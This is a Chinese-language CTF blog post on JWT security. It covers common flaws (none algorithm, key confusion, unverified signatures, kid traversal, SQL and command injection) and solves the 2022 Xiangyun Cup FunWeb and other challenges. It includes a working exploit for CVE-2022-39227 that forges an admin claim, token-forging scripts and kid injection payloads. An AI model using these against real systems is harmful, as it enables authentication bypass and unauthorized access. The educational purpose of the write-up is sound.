---
date: 2023-02-07
authors: [probius]
description: >
   "针对祥云杯中一道基于pythonJWT的Nday题目，谈谈Jwt和它存在的一些安全问题"
categories:
  - CTF
links:
  - docs/blog/posts/from-jwt-to-the-xiangyuncup-funweb.md
comments: true
---

# 祥云杯JWT题目以及JWT安全问题分析

针对祥云杯中一道基于pythonJWT的Nday题目，谈谈Jwt和它存在的一些安全问题

<!-- more -->

## About JWT

### What is JWT

Json Web Token(`JWT`)是一个开放标准([RFC 7519](https://www.rfc-editor.org/rfc/rfc7519))，它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象。此信息可以验证和信任，因为它足数字签名的。JWT可以使用密钥(使用 HMAC算法)或便用RSA或 ECDSA 的公钥/私钥对进行签名。

![img](https://nssctf.wdf.ink//img/WDTJ/1667407544497-f7e889c1-fedb-474e-bd81-57d3cdeb67a1.png)

注意：本文的重心并不在介绍JWT上，所以在官方文本的基础上会有一些删减。


如需了解更多，可以访问起官方网站，翻阅对应的文献资料：

https://jwt.io/introduction

https://jwt.io/

------

### JWT format

JWT的格式大致如下：

```plain
Header.Payload.Signature
```

![img](https://nssctf.wdf.ink//img/WDTJ/1667409378048-06076958-9b69-42c2-8f0a-2809a7b250b3.png)

对于任意JWT令牌，我们可以在jwt.io官网或者其他jwt解码工具查看详细：

![img](https://nssctf.wdf.ink//img/WDTJ/1667412576430-2fd13d4e-8f7f-4cb6-b084-e8e9d5b7036c.png)

#### Header

`JWT头`是一个描述JWT元数据的`JSON对象`，`alg属性`表示签名使用的算法，默认为HMAC SHA256（写为HS256）；`typ属性`表示令牌的类型，JWT令牌统一写为JWT。

最后，使用Base64 URL算法将上述JSON对象转换为字符串保存

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

#### Payload

`有效载荷`部分，是JWT的主体内容部分，也是一个`JSON对象`，包含需要传递的数据。 

JWT指定七个默认字段供选择：

```plain
iss：发行人
nbf：在此之前不可用(时间戳)
iat：发布时间(时间戳)
exp：到期时间(时间戳)
sub：主题
aud：用户
jti：JWT ID用于标识该JWT
```

这些预定义的字段并不要求强制使用。

除以上默认字段外，我们还可以自定义私有字段，一般会把包含用户信息的数据放到payload中，如下例：

```json
{
  "exp": 1667141915,
  "iat": 1667141615,
  "is_admin": 0,
  "is_login": 1,
  "jti": "5vpXRcirMlzlMPnx0sSX7w",
  "nbf": 1667141615,
  "password": "f61d",
  "username": "f61d"
}
#################################################################
[+] exp = 1667141915    ==> TIMESTAMP = 2022-10-30 22:58:35 (UTC)
[+] iat = 1667141615    ==> TIMESTAMP = 2022-10-30 22:53:35 (UTC)
[+] is_admin = 0
[+] is_login = 1
[+] jti = "5vpXRcirMlzlMPnx0sSX7w"
[+] nbf = 1667141615    ==> TIMESTAMP = 2022-10-30 22:53:35 (UTC)
[+] password = "f61d"
[+] username = "f61d"
```

#### Signature

签名哈希部分是对上面两部分数据签名，需要使用base64编码后的header和payload数据，通过指定的算法生成哈希,公式如下：

```plain
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```

注意的是，如果header部分中，参数alg置空，则无该部分(我们也称其为`Nonsecure JWT`)。

#### All IN

在计算出签名哈希后，JWT头，有效载荷和签名哈希的三个部分组合成一个字符串，每个部分用.分隔，就构成整个JWT对象

注意JWT每部分的作用，在服务端接收到客户端发送过来的JWT token之后：

- header和payload可以直接利用base64解码出原文，从header中获取哈希签名的算法，从payload中获取有效数据
- signature由于使用了不可逆的加密算法，无法解码出原文，它的作用是校验token有没有被篡改。服务端获取header中的加密算法之后，利用该算法加上secretKey对header、payload进行加密，比对加密后的数据和客户端发送过来的是否一致。注意secretKey只能保存在服务端，而且对于不同的加密算法其含义有所不同，一般对于MD5类型的摘要加密算法，secretKey实际上代表的是盐值

### JWT Classification

#### Nonsecure JWT 

header部分中，参数alg置空的JWT。

#### JWS

`JWS` ，也就是`JWT Signature`，其结构就是在之前`nonsecure JWT`的基础上，在头部声明签名算法，并在最后添加上签名。

创建签名，是保证jwt不能被他人随意篡改。

我们通常使用的JWT一般都是`JWS`

为了完成签名，除了用到header信息和payload信息外，还需要算法的密钥，也就是secretKey。

加密的算法一般有两类：

- 对称加密：secretKey指加密密钥，可以生成签名与验签
- 非对称加密：secretKey指私钥，只用来生成签名，不能用来验签(验签用的是公钥)

JWT的密钥或者密钥对，一般统一称为`JSON Web Key`，也就是`JWK`

如需了解JWT的签名算法可以前往其官网查阅：

https://jwt.io/libraries

### Use

如果您想知道如何将JWT用于开发中，请移步另一篇文章：(写作中......)

### Verification

JWT的后端验证是比较多样的，大概的流程可以参考下图：

![img](https://nssctf.wdf.ink//img/WDTJ/1667832274679-a093cb89-0329-4557-9917-46ad794742b5.png)

这也是说JWT的后端验证多样的原因，如何利用JWT的信息和signature综合的去验证JWT的有效性，在开发者选择使用JWT的适合就要做好相应的准备——生成和验证是一体的。



## Common Security risk of JWT

在简单了解了JWT之后，我们来看看JWT常见的一些安全风险：

### 敏感信息泄露

如果不当的使用Header和Payload部分，在其中存储一些敏感信息，可能会产生一定安全风险，因为两者只经过简单的base64编码。

当然这种在实际环境中很少见，但是却能成为个别CTF比赛的web签到题的考点（

### 签名算法替换

如果应用不限制 JWT中使用的算法类型，导致算法类型可控，这样会带给JWT巨大的安全风险。

#### 签名算法置空（CVE-2015-2951）

我们知道在JWT的头部中声明了token的类型和签名用的算法：

```python
{
  "alg": "HS256",
  "typ": "JWT"
}
```

上header指定了签名算法为`HS256`，意味着服务端利用此算法将header和payload进行加密，形成signature，同时接收到token时，也会利用此算法对signature进行签名验证。

如果后端程序信任来源的JWT头部，那么当我们改变器头部算法，将其置空设置为

```
None
```

那么服务端接收到token后会将其认定为无加密算法， 于是对signature的检验也就失效了，那么我们就可以随意修改payload部分伪造token。

当然这一切的前提是，后端信任前端。

比如2022年首届数据安全题目中的一道web题，我们就可以通过该方法伪造token。

```python
# 可以通过令algorithm为空，绕过对签名和密钥的检验
import jwt
payload = {
'username': 'admin'
}
token = jwt.encode(payload=payload,algorithm=None,key=None)
print(token)
'''
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
'''
```

![img](https://nssctf.wdf.ink//img/WDTJ/1667835816438-f3804cff-1113-48bf-87d2-c39f6138eb8d.png)

#### 非对称密码算法修改为对称算法(密钥混淆CVE-2016-10555)

HMAC和RSA是JWT比较常见的两种算法。

HMAC：token使用密钥签名，然后使用相同的密钥进行验证。（对称）

RSA    ：token将首先使用私钥创建，然后使用相应的公钥进行验证。（非对称）

对于两者，密钥和私钥都要保密，因为签名和校验依赖它们。

这里假设一个网站使用RSA生成和验证token，那么这里会有两个变量参与：私钥Prit和公钥Pub。

如果签名算法可控，我们将算法头改为`HMAC`，使用RSA的公钥Pub来生成一个token，那么我们将构造好的JWT发送回去时，后端验证查询则会用RSA的公钥Pub以HMAC的算法验证方式来验证token。

当然如果该漏洞存在，那么对于使用非对称加密的token，我们都可以尝试这样的方法，比如RS256变成HS256，比如这一道CTF题目：

https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/

### 签名未校验/ 无效签名

某些服务端并未校验JWT签名，可以尝试修改signature后(或者直接删除signature)，亦或者直接修改payload。

找到一个只有在被授权通过有效的JWT进行访问时才能访问此页面，我们将重放请求并寻找响应的变化以发现问题。

比如：

```python
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoicHJvYml1cyIsImFjdGlvbiI6InByb2ZpbGUifQ.5GVEWIw7-IdM9fQMt6H5Wxpmp1HpnyQb33CsXnZ9qKM
```

![img](https://nssctf.wdf.ink//img/WDTJ/1667840468890-8287cdc1-a5bd-4d5b-ba08-abc6165b11b8.png)

如果我们直接修改payload段，使用修改后的token重放，如访问页面正常，则说明漏洞存在。

### 伪造密钥(CVE-2018-0114)

jwk是header里的一个参数，用于指出密钥，存在被伪造的风险。

比如CVE-2018-0114： 

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114

攻击者可以通过以下方法来伪造JWT：删除原始签名，向标头添加新的公钥，然后使用与该公钥关联的私钥进行签名。

比如：

```json
{
  "typ": "JWT",
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "kid": "TEST",
    "use": "sig",
    "e": "AQAB",
    "n": "oUGnPChFQAN1xdA1_f_FWZdFAis64o5hdVyFm4vVFBzTIEdYmZZ3hJHsWi5b_m_tjsgjhCZZnPOLn-ZVYs7pce__rDsRw9gfKGCVzvGYvPY1hkIENNeBfSaQlBhOhaRxA85rBkg8BX7zfMRQJ0fMG3EAZhYbr3LDtygwSXi66CCk4zfFNQfOQEF-Tgv1kgdTFJW-r3AKSQayER8kF3xfMuI7-VkKz-yyLDZgITyW2VWmjsvdQTvQflapS1_k9IeTjzxuKCMvAl8v_TFj2bnU5bDJBEhqisdb2BRHMgzzEBX43jc-IHZGSHY2KA39Tr42DVv7gS--2tyh8JluonjpdQ"
  }
}
```

### 签名密钥爆破

按照JWT的结构，我们是可以得知其使用的签名算法的，如果可以爆破出对应的密钥，我们就能随意的"伪造"token了。

这里以HMAC签名举例：

HMAC签名密钥（例如HS256 / HS384 / HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。
因此，HMAC JWT破解是离线的，通过JWT破解工具，可以快速检查已知的泄漏密码列表或默认密码。

工具会在下边介绍。

### 泄露密钥

这个一般得打组合拳，配合如目录遍历、XXE、SSRF等可以读取存储密钥值文件漏洞，这样就可以窃取密钥并签署任意token。

### KID操控

KID代表“密钥序号”（Key ID）。它是JWT头部的一个可选字段，开发人员可以用它标识认证token的某一密钥。KID参数的正确用法如下所示：

```json
{
    "alg": "HS256",
    "typ": "JWT",
    "kid": "1"        //使用密钥1验证token
}
```

由于此字段是由用户控制的，因此可能会被恶意操纵并导致危险的后果。

#### 目录遍历

由于KID通常用于从文件系统中检索密钥文件，因此，如果在使用前不清理KID，文件系统可能会遭到目录遍历攻击。这样，攻击者便能够在文件系统中指定任意文件作为认证的密钥。

```json
"kid": "../../public/css/main.css"   //使用公共文件main.css验证token
```

这样我们就可以强行设定应用程序使用公开可用文件作为密钥，并用该文件给HMAC加密的token签名。

#### SQL注入

KID也可以用于在数据库中检索密钥。在该情况下，攻击者很可能会利用SQL注入来绕过JWT安全机制。
如果可以在KID参数上进行SQL注入，攻击者便能使用该注入返回任意值。

```json
"kid":"aaaaaaa' UNION SELECT 'key';--"  //Use a string "key" Authentication token
```

上面这个注入会导致应用程序返回字符串“ key”,

因为数据库中不存在名为"aaaaaaa"的密钥，然后使用字符串“ key”作为密钥来认证token。

#### 命令注入

有时，将KID参数直接传到不安全的文件读取操作可能会让一些命令注入代码流中。
一些函数就能给此类型攻击可乘之机，比如Ruby open（）。攻击者只需在输入的KID文件名后面添加命令，即可执行系统命令：

```json
"key_file" | whoami;
```

类似情况还有很多，这只是其中一个例子。理论上，每当应用程序将未审查的头部文件参数传递给类似`system()`，`exec()`的函数时，都会产生此种漏洞。

### 其他头部参数操控

除KID外，JWT标准还能让开发人员通过URL指定密钥。

#### JKU头部参数

JKU全称是“JWKSet URL”，它是头部的一个可选字段，用于指定链接到一组加密token密钥的URL。若允许使用该字段且不设置限定条件，攻击者就能托管自己的密钥文件，并指定应用程序，用它来认证token。

```json
jku URL->包含JWK集的文件->用于验证令牌的JWK
```

#### 操纵X5U，X5C URL

同JKU或JWK头部类似，x5u和x5c头部参数允许攻击者用于验证Token的公钥证书或证书链。x5u以URI形式指定信息，而x5c允许将证书值嵌入token中。



## JWTtool

如果您需要对您使用JWT的网站进行安全测试，这里也有对应的工具，比如JWTtool，上述常见的JWT漏洞都可以使用该工具进行利用：

https://github.com/ticarpi/jwt_tool

同时你也能在该项目的Wiki网站上获取更多jwt的知识：

https://github.com/ticarpi/jwt_tool/wiki

## 2022 XiangyunCup FunWeb

我们来看看2022年祥云杯的Web题——FunWeb。

这道题并没有考察传统的JWT漏洞 而是选择一个比较新的 1day (CVE-2022-39227 )来出题。

经典的开局一个登录框，登录页面抓包后先跑了admin的弱口令，当然现在的题一般没这么容易，并没有结果。

老老实实注册进去，有两个可以点的，一个是查看flag，一个是查看成绩，点击之后发现都需要admin身份，所以抓包分析看到了一下，发现`xxx.yyy.zzz`的token结构，下意识就去jwt.io解码了：

![img](https://nssctf.wdf.ink//img/WDTJ/1667845643643-eebf4026-3cc5-4319-a90a-583b1cdc0edf.png)

从payload可以判断大概这里就是突破点。

当然面对这样一道JWT的题目，常规攻击手段肯定是首选，不过这样的题目，如果常规打不下来，就得考虑在github上面找commit了。

所以在一天常规攻击无果后，于是开始找最近有关jwt的day，然后队里另外一位师傅翻到了python jwt的1day，也就是CVE-2022-39227

https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9

拉到最后我们可以看到作者在test中提供了漏洞POC：

```python
""" Test claim forgery vulnerability fix """
from datetime import timedelta
from json import loads, dumps
from test.common import generated_keys
from test import python_jwt as jwt
from pyvows import Vows, expect
from jwcrypto.common import base64url_decode, base64url_encode

@Vows.batch
class ForgedClaims(Vows.Context):
    """ Check we get an error when payload is forged using mix of compact and JSON formats """
    def topic(self):
        """ Generate token """
        payload = {'sub': 'alice'}
        return jwt.generate_jwt(payload, generated_keys['PS256'], 'PS256', timedelta(minutes=60))

    class PolyglotToken(Vows.Context):
        """ Make a forged token """
        def topic(self, topic):
            """ Use mix of JSON and compact format to insert forged claims including long expiration """
            [header, payload, signature] = topic.split('.')
            parsed_payload = loads(base64url_decode(payload))
            parsed_payload['sub'] = 'bob'
            parsed_payload['exp'] = 2000000000
            fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
            return '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'

        class Verify(Vows.Context):
            """ Check the forged token fails to verify """
            @Vows.capture_error
            def topic(self, topic):
                """ Verify the forged token """
                return jwt.verify_jwt(topic, generated_keys['PS256'], ['PS256'])

            def token_should_not_verify(self, r):
                """ Check the token doesn't verify due to mixed format being detected """
                expect(r).to_be_an_error()
                expect(str(r)).to_equal('invalid JWT format')
```

注意这一点注释：`"Use mix of JSON and compact format to insert forged claims including long expiration"`可以得知，这个漏洞的本质就是利用 json格式的注⼊  

如果稍加改造，我们就可以获得一个EXP：

```python
from datetime import timedelta
from json import loads, dumps
from common import generated_keys
import python_jwt as jwt
from pyvows import Vows, expect
from jwcrypto.common import base64url_decode, base64url_encode

def topic(topic):
    """ Use mix of JSON and compact format to insert forged claims including long expiration """
    [header, payload, signature] = topic.split('.')
    parsed_payload = loads(base64url_decode(payload))
    parsed_payload['is_admin'] = 1
    parsed_payload['exp'] = 2000000000
    fake_payload = base64url_encode(
        (dumps(parsed_payload, separators=(',', ':'))))
    # print (header+ '.' +fake_payload+ '.' +signature)
    # print (header+ '.' + payload+ '.' +signature)
    return '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'

originaltoken = '''eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxNDE5MTUsImlhdCI6MTY2NzE0MTYxNSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiI1dnBYUmNpck1semxNUG54MHNTWDd3IiwibmJmIjoxNjY3MTQxNjE1LCJwYXNzd29yZCI6ImY2MWQiLCJ1c2VybmFtZSI6ImY2MWQifQ.cqQ2RVegORBfB_fo33birEJs8Tw8WDM7wIYwfXz_BpW6gQG99cl-DePmP6iNx5Mf0aCwDcuqS-wOXjis7JVmhpf8dmdYkP_gLvYMULpPcFX03j70Cu3bhMWSAGUMjt_IFGQ1-xfwYp1LI9SWAlBM5wDPCh-gi96abRDvhRW-c-6mFul2us_XKl7kyceT2fY2ABrcJRSKA91kLm3ZOcD4FA6yuHMyKVfmN9RqPtzvvUVutniv03XPFTGIzHudzswRc0b3nN-XMsnyi_Ca62T8CVb1MMEDPVlDM7CDJmJXGfoNimkrOhPi22SItpv4tO7u-bbene3PpvW1Lv7UEQeDBg'''

topic = topic(originaltoken)
print(topic)
```

利用生成的json当作token传参即可绕过：

![img](https://nssctf.wdf.ink//img/WDTJ/1667847065180-579c6d06-711c-4c2b-acdc-8bc854a46812.png)

JWT的部分其实到这就结束了，后面如何拿flag就涉及到grahql的一个注入了，如果有时间，我会在下一篇文章总结一些SQL注入的知识。

## From FunWeb to CVE-2022-39227 vulnerability analysis

本来还想着要分析，最近时间不是很够，敲好J1an师傅直接把文档炫我嘴里了（，

![img](https://nssctf.wdf.ink//img/WDTJ/1667847767154-29fdc9b4-817c-4e39-9ba6-80335b838f62.png)

![img](https://nssctf.wdf.ink//img/WDTJ/1667847750329-8f0cc9f5-9ae8-46d8-bad9-555ee2173e64.png)

那这里原理分析我就直接使用J1an师傅的文章啦：

原文地址：https://forum.butian.net/share/1990 过审了所以添上了ww

[奇安信攻防社区-CVE-2022-39227漏洞分析.pdf](https://www.yuque.com/attachments/yuque/0/2022/pdf/21803058/1667847629252-562bc55d-8161-4c32-a5ff-1cad49da7960.pdf)

## Other Jwt topics

### [HFCTF2020]EasyLogin

该WriteUp来源：https://www.jianshu.com/p/0f76e1c69e33

#### 复现环境：

[https://buuoj.cn/challenges#[HFCTF2020\]EasyLogin](https://links.jianshu.com/go?to=https%3A%2F%2Fbuuoj.cn%2Fchallenges%23%5BHFCTF2020%5DEasyLogin)
[https://www.ctfhub.com/#/challenge](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.ctfhub.com%2F%23%2Fchallenge)

#### 题解

运行环境发现是一个登录页面，直接登录显示`Cannot read property 'split' of undefined`，**需要先注册再登陆。**
使用注册的普通账号登录，发现`get flag`按钮，点击提示`permission denied`，无权限，那么此题的方向应该是伪造成一个高权限账户。
截取登录包，发现两处可疑`authorization`校验字段，`Cookie`也存在`sses.aok`的校验

![img](https://nssctf.wdf.ink//img/WDTJ/1667899778186-b6a9fa71-efbe-4f8d-a1b8-5d5e096f4dca.png)

可以看到`xxx.yyy.zzz`的结构，解码可知为jwt

![img](https://nssctf.wdf.ink//img/WDTJ/1667899843564-133b73ed-452e-47eb-8a29-2ad42fbaaf93.png)

通过查看源码，发现/static/js/app.js 页面存在提示

```python
/**
 *  或许该用 koa-static 来处理静态文件
 *  路径该怎么配置？不管了先填个根目录XD
 */
```

**koa-static 错误配置的源码泄露**

说明 `app.js` 是直接静态映射到程序根目录的，直接访问根目录的该文件可直接看到源码

继续分析根目录的`app.js`，发现代码引用了两个当前目录的文件

```python
const rest = require('./rest');
const controller = require('./controller');
```

说明存在rest.js和controller.js文件

访问`rest.js`发现同样一个路径前缀 api

```python
const pathPrefix = '/api/';
```

访问`controller.js`看到下面的代码

遍历在controllers文件夹下的以.js结尾的文件，并且引入文件添加在router中，推断controllers文件夹下存在一个api.js文件

```python
function addControllers(router, dir) {
    fs.readdirSync(__dirname + '/' + dir).filter(f => {
        return f.endsWith('.js');
    }).forEach(f => {
        const mapping = require(__dirname + '/' + dir + '/' + f);
        addMapping(router, mapping);
    });
}

module.exports = (dir) => {
    const controllers_dir = dir || 'controllers';
    const router = require('koa-router')();
    addControllers(router, controllers_dir);
    return router.routes();
};
```

访问`/controllers/api.js`前端几个能看到的功能接口逻辑都在了，分析登录和注册接口

```python
# 注册：

const secret = crypto.randomBytes(18).toString('hex');

const secretid = global.secrets.length;

global.secrets.push(secret)

const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});


# 登录：

const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;

console.log(sid)

if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {     
    throw new APIError('login error', 'no such secret id');
}

const secret = global.secrets[sid];

const user = jwt.verify(token, secret, {algorithm: 'HS256'});
```

我们看到secretid值校验，要求 sid 不能为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间。JavaScript 是一门弱类型语言，可以通过空数组与数字比较永远为真或是小数来绕过，而这个题利用的是 将加密方式改为’none’ 的方法，

```python
print(jwt.encode({"secretid":0.1,"username":"admin","password":"admin"},algorithm="none",key="").decode('utf-8'))
```

把生成的值替换authorization的值就通过验证了

![img](https://nssctf.wdf.ink//img/WDTJ/1667900973813-aeafc668-6cc6-4b9c-b463-3d30067a05db.png)

登入之后点击get flag，权限足够，获得flag

![img](https://nssctf.wdf.ink//img/WDTJ/1667900984656-9ad6c80f-1f9b-4476-b745-accfd26a5c2d.png)

### CISCN 2019 华北赛区 Web - ikun

#### 复现环境

https://buuoj.cn/challenges

#### 题解

当然这道题还涉及逻辑漏洞和python反序列化，我们在这只提一下JWT部分，详细的WP师傅们可以在网上找到。

/b1g_m4mber这个页面，提示只允许admin访问

![img](https://nssctf.wdf.ink//img/WDTJ/1667904382380-0852286f-3e43-4392-a634-d2e06fccb725.png)

既然提示要admin，那基本上跟cookie有关，查看一下cookie，发现是JWT

解码可得：

![img](https://nssctf.wdf.ink//img/WDTJ/1667904433899-179df22b-189f-4163-9fdf-0405bab08f04.png)

而这道题对于jwt的解法是爆破密钥，我们用到一个叫[jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)的工具来爆破密钥。

当然 之前提到的 JWT tool 也支持密钥爆破。

![img](https://nssctf.wdf.ink//img/WDTJ/1667904553790-eab830ae-f17a-4a29-9452-529e1bc6ed91.png)

爆破出来密钥为1Kun，修改用户名为admin，修改token重放：

![img](https://nssctf.wdf.ink//img/WDTJ/1667904579739-cdd029cb-ae8a-441e-8526-fa78c736ab21.png)

接下来就是python反序列化了：

![img](https://nssctf.wdf.ink//img/WDTJ/1667904603214-9d2949a7-2a36-4224-b800-b6422ec42084.png)

## End

- Tool:

https://github.com/ticarpi/jwt_tool

https://github.com/brendan-rius/c-jwt-cracker

- Reference

https://github.com/ticarpi/jwt_tool/wiki

https://saucer-man.com/information_security/377.html

https://xz.aliyun.com/t/9376#toc-0